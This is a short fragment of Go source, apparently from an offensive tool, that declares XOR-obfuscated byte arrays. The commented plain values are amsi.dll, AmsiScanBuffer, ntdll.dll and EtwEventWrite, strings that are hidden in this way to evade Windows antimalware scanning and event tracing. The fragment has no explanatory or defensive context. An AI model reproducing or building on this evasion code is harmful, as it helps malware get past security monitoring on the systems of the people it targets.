...
var (
	encAmsiDll = []byte{0x1E, 0x12, 0x0C, 0x16, 0x51, 0x1B, 0x13, 0x13}                                     // amsi.dll
	encAmsiSB  = []byte{0x3E, 0x12, 0x0C, 0x16, 0x2C, 0x1C, 0x1E, 0x11, 0x3D, 0x0A, 0x19, 0x19, 0x1A, 0x0D} // AmsiScanBuffer
	encNTDll   = []byte{0x11, 0x0B, 0x1B, 0x13, 0x13, 0x51, 0x1B, 0x13, 0x13}                               // ntdll.dll
	encEtwEW   = []byte{0x3A, 0x0B, 0x08, 0x3A, 0x09, 0x1A, 0x11, 0x0B, 0x28, 0x0D, 0x16, 0x0B, 0x1A}       // EtwEventWrite
